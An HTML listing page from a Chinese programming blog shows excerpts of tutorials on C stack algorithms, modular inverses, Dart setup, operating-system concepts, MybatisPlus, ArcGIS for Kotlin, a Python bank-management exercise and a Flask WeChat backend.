栈顶字符对应的record&gt;0,(为0代表字符串后面不再有此元素，所以不能出栈)
🌟代码实现 判断特殊直接输出条件
s为空，长度为0；s长度为1，直接输出
if(s ==NULL || strlen(s) == 0){ return ""; } if(strlen(s) == 1){ return s; } 实现两个数组，一个用来计数一个用来做栈
//写两个数组，一个record一个stack char record[26] = {0}; int len = (int)strlen(s); //先看字符串长度是多少 //申请一个空间，指向字符数组 char *stack = (char *)malloc(len * sizeof(char)+1); //对stack赋初值 memset(stack, 0, len * sizeof(char)+1); int top = -1; 此处的空间开辟有伏笔，末尾的+1是为了输出成字符串，在程序运行的最后会让stack的最后一个位置加上‘\0’,所以此时+1空间正好
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c2564f37039cd5ea8c307301b182001b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dafef7f812a67510880e59c08d2fec1b/" rel="bookmark">
			逆元的定义，性质，求解方法与例题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、定义二、作用及证明作用.计算除法的模 (a/b) mod n证明： 三、求解方法1.扩展欧几里得算法2.欧拉定理与费马小定理（快速幂求法）3.线性递推（逆元打表） 四、性质（映射关系）1.性质2.证明 五、例题·瞬间移动1.分析2.代码 一、定义 若整数a、b满足同余方程a∗b≡1(mod n) ，那么a，b互为模n意义下的逆元
逆元存在的充要条件为gcd（a，n）为1.
二、作用及证明 作用.计算除法的模 (a/b) mod n 除法不可以使用之前分部的策略，否则结果将会产生问题。
证明： 1.若 ( a / b ) mod n = m，左右同时乘以 b
由于m 与（a/b）是关于模n同余的，
根据同余式的性质：
若a≡b (% p)，则对于任意的c，都有
(a * c) ≡ (b * c) (%p)
所以此时有：
a % n = （m * b）% n
2.若存在x，可使得 a * x = m%n，将x与上式的左右相乘
根据相同的性质，得：
（a * x）% n = （m * x * b）% n = m % n
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dafef7f812a67510880e59c08d2fec1b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd14180276bd7b4e36b9b2aa10aeae6c/" rel="bookmark">
			Win10 配置 Dart 环境变量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		打开“控制面板”，然后选择“系统与安全” &gt; “系统”在系统信息窗口中，选择“高级系统设置”在“系统属性”窗口中，选择“高级”选项卡，然后选择“环境变量”在“环境变量”窗口中，找到“系统变量”部分，然后点击“新建”按钮在“新建系统变量”对话框中，输入以下信息： 变量名：DART_SDK_HOME变量值：Dart SDK 的安装路径 点击“确定”按钮，然后关闭所有打开的窗口打开新的命令提示符窗口，并输入以下命令 dart --version 如果有 Dart 版本的输出，表示成功配置了环境变量
小提示：
如果是要在AS中运行，最好这样配置！（因为不这样，有可能会导致AS无法加载出 Dart）
直接配置在 Path 中，虽然cmd什么的都没有问题，但是AS中无法获取到（即使指定了 dart-sdk 的bin路径）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c682c9351a9cddd5338f2a341d9ca410/" rel="bookmark">
			操作系统基本概念
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习操作系统前需了解计算机的组成： 计算机系统的组成： 一般来说现代计算机由硬件和软件两部分组成。
可分为四个要素：
要素一：硬件设备，包括处理器（CPU）、存储器和I/O设备。
要素二：操作系统，例如Windows、Linux
要素三：支撑软件和应用软件
要素四：用户
计算机硬件组成及功能：
时至今日我们所用的计算机仍然采用冯·诺伊曼体系结构；运算器：完成算术运算和逻辑运算；控制器：控制器一般由指令寄存器、指令译码器、时序电路和控制电路组成，实现从内存取指令和执行指令；存储器分为内存和外存，内存指的就是主板上的存储部件，CPU直接与之沟通，内存的特点有：内存处理速度快、存储容量小、断电后信息丢失，外存包括软盘、硬盘和光盘，存放在其中的数据靠磁来维持，因此可永久保存数据，外存包括软盘、硬盘和移动光盘；I/O设备：常用的输入设备有键盘、鼠标、光笔、扫描仪等，输出设备有显示器、打印机、绘图仪等。
CPU又称为中央处理器，是计算机的心脏，由控制器和存储器构成。 操作系统的定义： 操作系统简称OS，操作系统的本质是一个大型的软件系统，对内它负责计算机的全部软件、硬件资源的管理，控制和协调并发活动，实现信息的存储和保护；对外为用户使用计算机系统提供使用方便的用户界面。
操作系统使计算机实现高效率和高度自动化。
计算机系统是一个资源集合体，包括软件资源和硬件资源；计算机硬件是操作系统赖以工作的实体，操作系统的运行离不开计算机硬件的支持。
操作系统的宗旨： 操作系统既面向用户又面向系统资源，面对用户OS必须尽可能提供方便易用的用户界面，面对系统资源，操作系统要实现对处理机、内存、设备、文件和网络的管理，OS必须尽可能提高资源利用率
操作系统的目标： 操作系统的目标有：使得计算机系统使用方面；使得计算机系统高效工作；操作系统是一种系统程序，其目的是为了提供一个供其他程序执行的良好环境。
操作系统的分类： 1.分时操作系统
2.批处理系统
3.实时操作系统
4.网络操作系统
5.分布式操作系统
分时操作系统：
分时操作系统采用时间片、动态优先数等方式使CPU轮流为多个用户终端或多个任务服务。分时操作系统的主要特点有：多路调制性，也就是同时有多个程序并发执行，CPU以分时方式轮流为他们服务；独占性，响应速度满足要求，使用户感觉独占了CPU，此处的独占指的是逻辑上独占，而物理上并非如此；交互性，交互性是分时系统的一个重要特征，分时操作系统会以窗口菜单或键盘命令方式提供给用户。
如果操作系统具有很强的交互性，可同时提供给多个用户，则属于分时操作系统类型。
批处理操作系统：
提到批处理我们首先需要了解多道程序设计。
多道程序设计技术是在计算机内存中同时放几个相互独立的程序，他们在操作系统管理程序是控制下相互穿插地运行。
引入多道程序的目的在于：充分利用CPU，减少CPU的等待时间。
独派大批程序设计技术具有以下特征：多道；宏观上并行，从用户角度看，所有的程序都在运行；微观上串行，从硬件设备角度看，每次只运行一道程序。
批处理的优点是系统吞吐量大，资源利用率高，但是在批处理环境下，用户作业一旦运行就不再由用户控制，直至结束，所以批处理系统不具有交互性，这是其缺点。
实时操作系统： 实时操作系统要求快速的响应时间，一般在毫秒、微妙级别。
实时操作系统的特点：1.对响应时间的实时要求；2.系统可靠性和安全性放在第一位，系统效率放在次要位置，交互性差或根本没有交互性；3.系统整体性强。
如果操作系统可靠，事件响应及时但仅有简单的交互能力，则属于实时操作系统类型。
操作系统的特性： 1.并发性：由于多道程序同时在内存中，可能分别占有CPU或I/O设备，在不同的硬件或设备上同时运行，这就是并发性。并发性的好处是使得CPU与外设同时并行执行，提高了资源的利用率。
2.共享性：由于并发性的存在，使得系统资源不再由一个程序独占，而是多个程序共享；所以并发性与共享性是一对矛盾，二者之间互为存在条件。
3.不确定性：执行结果会因为受到运行环境的不同而不同。
4.虚拟性：1）操作系统虚拟机，
处理机的态： 处理机的态至少分成两态—系统态和目态（用户态）；用户态表示当前CPU上运行的是用户程序，有的操作系统还将系统态细分为管态和核态；核态比管态更高级保护级更高，是CPU最高保护级别的态。
由于态的划分，又出现了特权指令和非特权指令。
特权指令只能在核态或管态下执行！
特权指令是可能影响系统安全的一类指令，特权指令只允许操作系统使用，执行特权指令时系统处于管态。
以下是特权指令：
处理机的转换：
1、由用户态（目态）转为系统态
此时通过中断机制来完成！
2、由系统态转为用户态
CPU由系统态转换为用户态是通过操作系统的服务程序中执行特权指令“中断返回”实现的。
中断机制： 中断是计算机系统中非常重要的技术之一！在系统发生中断时程序当前执行完毕的指令地址称为断点。中断指的是当某个事件（如I/O结束、电源故障、程序错误、请求系统服务器等）发生时，CPU中断当前执行的程序，转而执行处理该事件的服务程序（中断服务程序），处理结束后再返回到现行程序的间断处，继续执行。
用通俗易懂的语言表达就是：中断指当某个事件发生时系统中止现行的程序的运行，引出中断服务程序进行处理，处理结束返回断点继续执行程序的过程。
引发中的事件称为中断源，实现中断响应过程的统称为中断装置，处理该事件的程序称为中断服务程序。
中断的类型：
1、I/O中断（属于外中断）eg：打印机在使用过程中由于缺纸产生的中断
2、外中断（属于外中断）
3、机器故障中断 （内中断）
4、程序性中断 eg：程序错误和程序越界引起的中断
5、访管中断 eg：用户程序执行系统调用产生的中断、用户源程序请求系统服务的地方使用系统调用而产生的中断。（此中断属于自愿性中断）
中断响应：
指的是当CPU发现有中断请求时，终止当前程序的执行，并自动引出中断处理程序的过程。中断响应是由硬件完成的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c682c9351a9cddd5338f2a341d9ca410/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/292da75a358f2f12bd5954594361f931/" rel="bookmark">
			MybatisPlus如何完成字段类型转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先来回忆下在mybatis中的resultMap作用和是什么
resultMap的作用是什么 在使用传统的mybatis时，我们一般都会在xml文件定义一个ResultMap
对每个字段都有自己的定义都有两个类型
javaType可以不显式写出来，mybatis可以根据指定的实体类推断出来
jdbcType 也就是对应到数据库中的字段类型
mybatis完成数据库的数据到java实体类型的转换这两个类型是必不可少的。会根据javaType和jdbcType去匹配到对应的处理器完成类型转换
mybatis内置了很多typeHandler在启动时注册
public TypeHandlerRegistry(Configuration configuration) { this.unknownTypeHandler = new UnknownTypeHandler(configuration); register(Boolean.class, new BooleanTypeHandler()); register(boolean.class, new BooleanTypeHandler()); register(JdbcType.BOOLEAN, new BooleanTypeHandler()); register(JdbcType.BIT, new BooleanTypeHandler()); register(Byte.class, new ByteTypeHandler()); register(byte.class, new ByteTypeHandler()); register(JdbcType.TINYINT, new ByteTypeHandler()); register(Short.class, new ShortTypeHandler()); register(short.class, new ShortTypeHandler()); register(JdbcType.SMALLINT, new ShortTypeHandler()); register(Integer.class, new IntegerTypeHandler()); register(int.class, new IntegerTypeHandler()); register(JdbcType.INTEGER, new IntegerTypeHandler()); register(Long.class, new LongTypeHandler()); register(long.class, new LongTypeHandler()); register(Float.class, new FloatTypeHandler()); register(float.class, new FloatTypeHandler()); register(JdbcType.FLOAT, new FloatTypeHandler()); register(Double.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/292da75a358f2f12bd5954594361f931/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95b82fbdb4384753a84f8d35bf487755/" rel="bookmark">
			始终从最不易改变的方面开始
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在你刚开始新工作、转换职业或者是加入新项目时，始终从最不易改变的方面开始。
在工作中，这可能意味着与团队成员建立关系，了解公司的流程和文化，或者熟悉公司的产品或服务。
在一项新项目中，这可能意味着了解项目范围，确定项目目标和需求，或者与利益相关者进行沟通和协作。无论是什么情况，始终从最不易改变的方面开始，这将有助于你建立一个坚实的基础，并确保你在后续的工作中能够取得成功。
在你的职业生涯中，你将会遇到的资源，从最不易改变到最易改变的顺序是：
人流程代码 始终以人为本。人们是由他们的生活所塑造的。如果没有一些疯狂的事情发生，就不可能快速改变一个人。
如果人们让你感到不舒服，就逃之夭夭。毕竟，为了拥有一个尚可的职业而花费自己的生命去改变别人是不值得的。
流程是可以改变的。但流程与激励措施息息相关。
如果你觉得和这些人一起工作很有趣，而且能让你充满活力，那就努力制定激励措施。因为一个好的激励措施可以让同一组人的成果和幸福感倍增。
可以最后再着手编写代码。
代码总是可以被改变的。它们可以很容易地被修改以适应几乎任何需求。
首先找到合适的人，为他们建立良好的流程，然后再决定需要编写什么代码来提供价值。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a76613fda5c660768cfd843f5c4de625/" rel="bookmark">
			学习ArcGIS Maps SDK for Kotlin(200)系列 001-初识ArcGIS Maps SDK for Kotlin
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ArcGIS Maps SDK for Kotlin （Beta）
文章目录 初识ArcGIS Runtime SDK一、主要特点二、开始使用1.使用 ArcGIS 帐户登录2.获取api密钥3.部署应用程序4.详细浏览教程小结 初识ArcGIS Runtime SDK ArcGIS Runtime SDK 现在称为 ArcGIS Maps SDKs for Native Apps！
ArcGIS Maps SDK for Kotlin 版本 200.0（测试版）基于 ArcGIS Runtime 100.x 的成熟架构构建，旨在利用最新的开发人员框架创新。它为协程、流和空安全等功能提供开箱即用的支持。在发布投入生产时，ArcGIS Maps SDK for Kotlin 将取代基于 Java 的 ArcGIS Runtime SDK for Android，并且需要对应用程序代码进行一些重写。
一、主要特点 ArcGIS Maps SDK for Kotlin 使用 Kotlin 构建可部署到 Android 操作系统的本机应用程序。本页面介绍了可添加到应用程序中的常见 ArcGIS Maps SDK for Kotlin 功能。
访问服务
使用 和 OAuth 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a76613fda5c660768cfd843f5c4de625/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ec521b0ac0d178b373b2511e873b539/" rel="bookmark">
			银行管理系统--课后程序(Python程序开发案例教程-黑马程序员编著-第7章-课后作业)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实例1：银行管理系统 从早期的钱庄到现如今的银行，金融行业在不断地变革；随着科技的发展、计算机的普及，计算机技术在金融行业得到了广泛的应用。银行管理系统是一个集开户、查询、取款、存款、转账、锁定、解锁、退出等一系列的功能的管理系统，该系统中各功能的介绍如下。
开户功能：用户在ATM机上根据提示“请输入姓名:”、“请输入身份证号:”、“请输入手机号:”依次输入姓名、身份证号、手机号、预存金额、密码等信息，如果开户成功，系统随机生成一个不重复的6位数字卡号。查询功能：根据用户输入的卡号、密码查询卡中余额，如果连续3次输入错误密码，该卡号会被锁定。取款功能：首先根据用户输入的卡号、密码显示卡中余额，如果连续3次输入错误密码，该卡号会被锁定；然后接收用户输入的取款金额，如果取款金额大于卡中余额或取款金额小于0，系统进行提示并返回功能页面。存款功能：首先根据用户输入的卡号、密码显示卡中余额，如果连续3次输入错误密码，该卡号会被锁定，然后接收用户输入的取款金额，如果存款金额小于0，系统进行提示并返回功能页面。转账功能：用户需要分别输入转出卡号与转入卡号，如果连续3次输入错误密码，卡号会被锁定。当输入转账金额后，需要用户再次确认是否执行转账功能；如果确定执行转账功能，转出卡与转入卡做相应金额计算；如果取消转账功能，则回退之前操作。锁定功能：根据输入的卡号密码执行锁定功能，锁定之后该卡不能执行查询、取款、存款、转账等操作。解锁功能：根据输入的卡号密码执行解锁功能，解锁后能对该卡执行查询、取款、存款、转账等操作。存盘功能：执行存盘功能后，程序执行的数据会写入本地文件中。退出功能：执行退出功能时，需要输入管理员的账户密码，如果输入的账号密码错误，则返回功能页面，如果输入的账号密码正确，则执行存盘并退出系统。 本实例要求编写程序，实现一个具有上述功能的银行管理系统。
实例目标 理解面向对象的思想熟练地定义类熟练地创建对象、访问类的成员熟练使用构造方法 实例分析 实际生活中，银行管理系统在由银行工作人员打开时先显示欢迎界面，之后工作人员输入管理员账号与密码，银行管理系统被启动，启动后进入系统功能页面，可观察到该页面中展示了使用ATM机可办理的所有业务，包括开户（1）、查询（2）、取款（3）、存款（4）、转账（5）、锁定（6）、解锁（7）、退出（Q）等。用户可根据自己需求选择相应业务的编号，并按照提示完成相应的操作。
从以上模拟的过程中可知，要实现银行管理系统需要用到5种对象，分别是管理员、ATM机、银行卡、用户、银行管理系统。因此，我们需要设计5个类承担不同的职责，关于这些类的说明如下：
（1）银行管理系统类（HomePage）：负责提供整个系统流程的相关操作，包括打印欢迎登录界面和功能界面、接收用户输入、保存用户数据等。
（2）ATM机类（ATM）：负责处理系统中各个功能的相关操作，包括开户、查询、取款、存款、转账、锁定、解锁、退出功能。
（3）管理员类（Admin）：负责提供检测管理员账号与密码、显示欢迎登录界面和功能界面的相关操作。
（4）用户类（User）：负责提供用户对象的相关操作。
（5）银行卡（Card）：负责提供银行卡对象的相关操作。
设计后的类结构如图1所示。
图1 类设计图
本实例中涉及到多个类，为保证程序具有清晰的结构，可以将每个类的相关代码分别放置到与其同名的.py文件中。
代码实现 本实例的具体实现过程如下所示。
（1）打开PyCharm工具，创建一个名为“银行管理系统”的文件夹。在该文件夹下创建5个.py文件，分别为admin.py、atm.py、card.py、user.py与“银行系统.py”，此时程序的目录结构如图2所示。
图2 目录结构
（2）按照图1的类设计图，在card.py文件中编写Car类的代码，具体如下所示。
class Card:
def __init__(self,cardId,cardPwd,money):
self.cardId = cardId
self.cardPwd = cardPwd
self.money = money
self.cardLock = False
（3）按照图1的类设计图，在user.py文件中编写User类的代码，具体如下所示。
class User:
def __init__(self, name, id, phone, card):
self.name = name
self.id = id
self.phone = phone
self.card = card
（4）按照图1的类设计图，在admin.py文件中编写Admin类的代码，具体如下所示。
class Admin:
adminU = '1' # 管理员的账号
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7ec521b0ac0d178b373b2511e873b539/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0f921372b4c39d65703bbefbd5f51cd/" rel="bookmark">
			[python]用flask框架搭建微信公众号的后台
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		用flask框架搭建微信公众号的后台 最近用python写了点爬虫，为了要让爬取的数据能够随时显示在我眼前，并实时根据我的指令返回数据。于是采用微信公众号做这个显示窗口，既能发送指令也能显示简单的相关数据。
准备工具 python3.x环境
pycharm
一台服务器（可以使用内网穿透）
申请一个微信公众号
一、搭建微信公众号后台 查看公众号 ​ 登录公众号平台，在基础配置中设置相关信息，点提交时微信会访问我设置的接口，如果我返回了正确的信息，那我的公众号就与我的这个接口绑定上了，之后微信所有的消息都将通过调用我的这个接口来与我的服务器交互。现在提交肯定是失败的，我还没有配置后端，自然是请求不到，且看我下面的操作。
使用flask框架搭建一个后端服务器 ​ 创建app.py，然后通过flask搭建后端服务器，这里的代码是完整代码，其中WxHandle是响应微信请求的具体实现。这个项目一直监听的是8800端口，但我后面会用nginx反向代理一波。
app.py
from flask import Flask, request from loguru import logger from wx_handle import WxHandle # 配置web框架 app = Flask(__name__) # 日志文件保存10天日志，最大存储500M logger.add("./log/runtime_{time}.log", retention="10 days", rotation="500 MB") # 暴露路由，接收get和post请求 @app.route('/', methods=["GET", "POST"]) def wx_listener(): # 通过getattr获取到WxHandle的静态get或post方法，lower是为了将大写method值转为小写，与WxHandle中的方法名对应 fun = getattr(WxHandle, request.method.lower()) # 调用得到的get或post方法 return fun() if __name__ == "__main__": # 监听8800端口 app.run(host="0.0.0.0", port=8880) WxHandle的具体实现 ​ WxHandle是响应微信消息的具体入口，所有的请求都或通过post或get方法来得到回复。这其中的签名算法和具体消息对象也会在下面体现。
wx_handle.py
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d0f921372b4c39d65703bbefbd5f51cd/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/101/">«</a>
	<span class="pagination__item pagination__item--current">102/321</span>
	<a class="pagination__item pagination__item--next btn" href="/page/103/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>